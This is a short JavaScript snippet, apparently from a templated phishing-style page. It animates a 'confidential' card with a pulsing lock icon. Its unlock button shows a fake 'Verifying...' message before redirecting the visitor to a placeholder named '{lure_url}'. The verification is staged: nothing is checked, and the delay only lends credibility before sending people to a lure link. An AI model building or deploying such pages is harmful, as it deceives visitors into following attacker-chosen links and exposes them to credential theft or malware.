function unlockMessage() {
    const btn = document.querySelector('.btn-unlock');
    btn.innerHTML = '<span>Verifying...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

document.addEventListener('DOMContentLoaded', () => {
    const card = document.querySelector('.confidential-card');
    card.style.opacity = '0';
    card.style.transform = 'translateY(20px)';
    
    setTimeout(() => {
        card.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
        card.style.opacity = '1';
        card.style.transform = 'translateY(0)';
    }, 200);
    
    const lockIcon = document.querySelector('.lock-icon');
    lockIcon.style.animation = 'pulse 2s infinite';
});
